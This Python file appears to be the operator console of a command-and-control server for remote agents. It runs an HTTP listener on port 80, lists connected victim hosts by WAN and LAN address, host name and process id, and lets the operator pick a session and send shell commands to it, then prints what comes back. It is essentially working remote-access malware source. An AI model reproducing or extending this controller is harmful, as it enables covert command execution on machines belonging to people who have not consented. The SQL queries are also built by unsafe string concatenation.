import socketserver
from Http_Server import *
from multiprocessing  import *
from Conf import *
from threading import *

def Create_Agree(target):
    My_Agree=Process(target=target)
    My_Agree.start()
    #My_Agree.join()


if __name__=="__main__":
    My_Clinet_Data_Storage=Clinet_Data_Storage()
    Http_Agree=socketserver.ForkingTCPServer(("0.0.0.0",80),My_Http_TCPHandler)
    Create_Agree(Http_Agree.serve_forever)
    Conn_Update=Thread(target=My_Clinet_Data_Storage.Clinet_Conn_Update)
    Conn_Update.start()
    id=0
    Input_print="Sever"
    while(1):
        Input_Server=input(Input_print+":")
        if(Input_Server=="list"):
            sql="Select Id,Agree,Wan,Lan,SysName,HostName,Pid From Clinet_Data;"
            Clinet_List=My_Clinet_Data_Storage.Clinet_Conn_Select(sql)
            for Clinet_conn in Clinet_List:
                print(Clinet_conn)
            
        if("session" in Input_Server):
            id=int(Input_Server[8:])
            Input_print="Sever "+str(id)

        if("info"==Input_Server):
            print("session:"+str(id))

        if("shell" == Input_Server[:5]):
            if(id!=0):
                sql="Select Agree,Wan,Pid From Clinet_Data where id="+str(id)+';'
                Session_ID=My_Clinet_Data_Storage.Clinet_Conn_Select(sql)
                Session_ID=Session_ID[0]
                Send_Cmd=Input_Server[6:]
                My_Clinet_Data_Storage.Clinet_Conn_Snd_Cmd_Update(Send_Cmd,Session_ID[0],Session_ID[1],Session_ID[2])
                while(1):
                    sql="Select Return_Cmd From Clinet_Data where id="+str(id)+";"
                    Return_Cmd=My_Clinet_Data_Storage.Clinet_Conn_Select(sql)
                    
                    if(Return_Cmd[0][0]!=None and len(Return_Cmd[0][0])>0):
                         #print(4)
                         My_Clinet_Data_Storage.Clinet_Conn_Return_Cmd_Update("NULL",Session_ID[0],Session_ID[1],str(Session_ID[2]))
                         print(Return_Cmd[0][0])
                         break
                


        '''
        CMD=CMD.split(",")
        My_Clinet_Data_Storage.Clinet_Conn_Snd_Cmd_Update(CMD[0],CMD[1],CMD[2],CMD[3])
        while(1):
            sql="Select Return_Cmd From Clinet_Data where Agree='"+CMD[1]+"' and Wan='"+CMD[2]+"' and Pid='"+CMD[3]+"';"
            Rerurn_Cmd=My_Clinet_Data_Storage.Clinet_Conn_Select(sql)
            if(Rerurn_Cmd[0]!=None):
                My_Clinet_Data_Storage.Clinet_Conn_Return_Cmd_Update('',CMD[1],CMD[2],CMD[3])
                My_Clinet_Data_Storage.Clinet_Conn_Snd_Cmd_Update('',CMD[1],CMD[2],CMD[3])
                print(Rerurn_Cmd[0])
                break
        '''
        